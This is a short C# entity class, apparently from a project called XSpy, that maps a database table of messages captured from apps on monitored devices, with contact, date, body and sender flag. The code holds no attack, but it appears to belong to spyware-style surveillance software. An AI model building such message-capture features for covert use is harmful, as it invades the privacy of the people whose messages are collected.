using System;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;
using XSpy.Database.Entities.Devices.Base;
using XSpy.Database.Models;


namespace XSpy.Database.Entities.Devices
{
    [Table("device_app_messages")]
    public class AppMessage : BaseDeviceEntity
    {
        [Column("contact_id"), ForeignKey(nameof(Contact))]
        public Guid ContactId { get; set; }

        [Column("message_date")]public DateTime MessageDate { get; set; }

        [Column("body"), MaxLength(180)] public string Body { get; set; }
        [Column("is_own")] public bool IsOwn { get; set; }
        [Column("app_type")] public AppType AppType { get; set; }

        public AppContact Contact { get; set; }
    }
}